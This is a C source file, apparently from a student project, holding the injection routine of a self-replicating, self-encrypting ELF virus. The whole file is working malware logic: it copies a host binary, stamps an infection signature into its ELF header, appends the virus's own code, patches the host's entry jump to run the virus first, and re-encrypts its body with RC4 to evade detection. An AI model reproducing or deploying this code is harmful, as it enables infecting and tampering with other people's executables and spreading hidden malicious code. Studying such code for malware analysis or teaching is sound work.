/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   inject.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/03 19:38:40 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void		inject(t_data *data)
{

	revert_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);

#ifdef DEBUG
	char de[] = "inject\t \n";
	data->context == true ?	de[7] = 49 : 48;
	_write(1, de, _strlen(de));
#endif

	if (data->context == false || data->context != true)
		goto ERR;

	data->context = false;
	int				size = data->virus.size + data->virus.note->p_offset;
	uint8_t			*map = _mmap(0, size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	if (map == MAP_FAILED)
		goto ERR;

	register int	off = 0;
	int				lim = 0;
	uint8_t			*dst = map;
	uint8_t			*src = data->bin.map;

	//	step 1 : copy
	lim = data->virus.data->p_offset + data->virus.data->p_filesz;
	while (off < lim)
	{
		*dst++ = *src++;
		off++;
	}

	// step 2 : insert signature
	data->header = (Elf64_Ehdr*)map;
	*(uint32_t*)&data->header->e_ident[EI_PAD] = SIGNATURE;

	// step 3 : pad
	lim = data->virus.note->p_offset;
	while (off < lim)
	{
		*dst++ = 0;
		off++;
	}

	// step 4 : inject itself
	uint8_t *beg = (uint8_t*)start;
	for (register int i = 0 ; i < (int)data->virus.size ; i++)
	{
		*dst++ = *beg++;
		off++;
	}

	// step 5 : patch entrypoint
	dst -= ((size_t)end_of_data - (size_t)cypher_end);
	while (*dst != 0xe9)
		dst++;
	if ((void*)dst >= (void*)data->bin.map + data->bin.size)
		goto ERR;
	data->bin_entry = data->bin_entry - data->vrs_entry - (data->virus.size - ENTRY_OFF);
	if (_memcpy(dst + 1, &data->bin_entry, 4) != dst + 1)
		goto ERR;


	// step 5.5 : revert current func in infected
	dst = map + data->virus.note->p_offset + ((size_t)inject - (size_t)start);
	revert_two(&data->key, (char*)dst, (size_t)release - (size_t)inject);

//	step 6 : Encrypt data
	dst = map + (data->virus.note->p_offset + ((size_t)opening - (size_t)start));
	_memcpy(data->cpr_key, (uint8_t*)_rc4, KEY_SIZE);
	_rc4((uint8_t*)data->cpr_key, KEY_SIZE, dst, (size_t)_rc4 - (size_t)opening);

	// final : write
	_write(data->bin.fd, map, size);
	data->context = true;

ERR:
	_munmap(map, size);

	update_one(&data->key, (char*)inject, (size_t)release - (size_t)inject);
	revert_one(&data->key, (char*)release, (size_t)cypher_end  - (size_t)release);

	release(data);
}
